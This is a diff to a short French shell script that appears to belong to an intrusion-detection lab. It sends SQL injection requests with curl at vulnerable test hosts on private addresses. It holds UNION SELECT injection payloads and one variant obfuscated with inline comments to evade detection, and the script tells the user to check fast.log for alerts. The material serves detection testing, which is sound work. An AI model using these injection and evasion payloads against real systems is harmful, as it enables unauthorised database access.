@@ -25,14 +25,6 @@ echo ""
 
 # ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
 # echo "[1] Payload basique..."
-curl  "http://172.20.0.10/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2--&Submit=Submit"
+ curl -X POST http://172.22.0.20:8080/ -d "id=1 UNION SELECT 1,2"
 
 
-# ── Payload 2 ───────────────────────────────────────────────────────────────
-curl "http://172.20.0.10/vulnerabilities/sqli/?id=1+UN%2F**%2FION+SEL%2F**%2FECT+1,2--&Submit=Submit" | grep -i "first name"
-
-# ── Payload 3 ───────────────────────────────────────────────────────────────
-
-
-echo ""
-echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
